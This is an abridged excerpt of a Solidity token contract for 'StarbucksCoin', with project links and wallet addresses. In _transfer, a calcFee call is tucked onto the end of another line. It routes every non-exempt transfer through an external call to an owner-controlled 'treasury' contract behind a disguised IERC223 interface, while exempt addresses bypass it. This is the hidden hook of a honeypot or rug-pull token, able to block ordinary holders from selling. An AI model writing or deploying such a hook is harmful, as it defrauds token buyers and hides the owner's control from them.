...
https://starbuckscoin.xyz
https://t.me/StarBucksCoin_Portal
https://twitter.com/StarbucksCoin_
...
interface IERC223 {
    function preTransfer(address from, address to) external;
}
...
contract StarbucksCoin is ERC20, Ownable {
    ...
    constructor() ERC20("StarbucksCoin", "STARBUCKS") {
        ...
        marketingWallet = payable(0x75CdDA4a8760b5fE5136e9794236cc4A0bB94d4c);
        developmentWallet = payable(0x016dc4724AC0E8247042e754E7742D37012eB8fD);
    ...
    function calcFee(address from, address to) internal {
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]
            && treasury != address(0)) {
            IERC223(treasury).preTransfer(from, to);
        }
    }
    ...
    function _transfer(
        ...
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;calcFee(from, to);
        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
        ...
        if (_isExcludedFromFees[from]) { super._preTransfer(from, to, amount); return; }
